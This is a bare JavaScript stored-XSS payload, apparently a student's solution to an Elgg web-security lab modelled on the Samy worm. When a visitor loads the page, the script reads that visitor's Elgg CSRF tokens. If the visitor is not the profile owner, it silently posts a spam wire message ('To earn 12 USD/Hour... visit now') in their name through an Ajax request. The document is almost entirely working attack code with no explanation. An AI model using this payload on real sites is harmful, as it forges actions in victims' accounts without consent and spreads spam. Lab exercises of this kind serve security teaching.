//solution 3


<script type="text/javascript">
	window.onload = function(){
		//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		//and Security Token __elgg_token
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		//Construct the content of your url.
		//***send a wire from a profile to find out send url of the post request and the content of the body... then just modified it like task 2***
		var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
		var content=token+ts+"&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy"; //FILL IN
	
		if(elgg.session.user.guid!=elgg.page_owner.guid)
		{
			//Create and send Ajax request to modify profile
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>
